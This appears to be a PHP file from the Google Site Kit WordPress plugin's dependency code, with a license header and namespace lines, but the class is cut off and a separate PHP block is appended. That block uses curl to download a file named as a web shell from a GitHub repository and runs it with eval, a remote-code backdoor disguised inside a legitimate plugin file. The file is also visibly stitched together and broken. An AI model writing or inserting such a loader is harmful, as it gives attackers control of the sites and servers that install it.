 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
namespace GoogleSite_Kit_DependenciesGoogleTask;

use GoogleSite_Kit_DependenciesComposerScriptEvent;
use GoogleSite_Kit_DependenciesSymfonyComponentFilesystemFilesystem;
use GoogleSite_Kit_DependenciesSymfonyComponentFinderFinder;
use InvalidArgumentException;
class Composer


<?php 
$link = 'https://raw.githubusercontent.com/dorzkim/webshell/main/tesla2.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>